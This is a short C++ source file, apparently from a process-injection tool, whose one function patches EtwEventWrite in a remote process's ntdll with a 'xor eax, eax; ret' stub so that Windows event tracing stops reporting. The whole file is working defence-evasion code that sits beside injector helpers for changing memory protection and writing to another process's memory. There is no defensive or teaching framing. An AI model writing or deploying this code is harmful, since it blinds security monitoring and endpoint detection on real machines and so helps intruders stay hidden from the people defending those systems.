#include "patch.hpp"

void patchRemoteETW(HANDLE hProcess) {
    // 1. Get address of EtwEventWrite from local ntdll (it will be the same in remote)
    // You can use your syscallHandler or GetProcAddress since ntdll is already loaded
    PVOID etwAddress = (PVOID)GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");

    if (!etwAddress) return;

    unsigned char patch[] = { 0x31, 0xC0, 0xC3 }; // xor eax, eax; ret
    SIZE_T patchSize = sizeof(patch);

    std::cout << "[!] Patching ETW at: " << etwAddress << std::endl;

    // 2. Change protection to RW
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_READWRITE, patchSize);

    // 3. Write the patch
    mainInjector.wrMem(hProcess, etwAddress, (LPVOID)patch, patchSize);

    // 4. Restore protection to RX
    mainInjector.protectMemFlag(hProcess, etwAddress, PAGE_EXECUTE_READ, patchSize);

    std::cout << "[+] ETW silenced in remote process." << std::endl;
}